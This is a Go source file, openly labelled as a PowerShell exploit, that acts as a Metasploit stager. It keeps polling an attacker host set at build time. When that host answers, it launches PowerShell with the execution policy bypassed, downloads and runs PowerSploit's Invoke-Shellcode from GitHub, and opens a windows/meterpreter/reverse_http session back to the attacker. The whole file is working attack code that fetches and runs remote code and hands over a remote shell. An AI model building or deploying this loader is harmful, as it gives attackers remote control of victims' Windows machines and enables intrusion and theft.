// Powershell exploit reverse http metasploit
// It will connect with a meterpreter session running on LHOST:LPORT granting superpowers ;)

package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

var (
	// Injected on build
	LHOST string
	LPORT string
)

var (
	url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/2499a39b04d9eec2afc4cde19b56f0631f2affa3/CodeExecution/Invoke--Shellcode.ps1"
	cmd = fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString('%s')`, url)

	shell = fmt.Sprintf("Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost %s -lport %s -Force -Verbose", LHOST, LPORT)
)

// Exploit the target
func exploit() {
	for {
		if isReadyForConnection() {
			binary, _ := exec.LookPath("powershell")
			exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell)).Run()

			break
		}

		// One try per second
		time.Sleep(time.Second)
	}
}

// Check if the remote host is ready for connection
func isReadyForConnection() bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", fmt.Sprintf("http://%s:%s", LHOST, LPORT), nil)
	req.Header.Set("User-Agent", "Meterpreter_Reverse_Http_Ping_Bot/1.0")
	resp, err := client.Do(req)
	if resp != nil && err == nil {
		if resp.StatusCode == 200 {
			return true
		}
	}

	return false
}
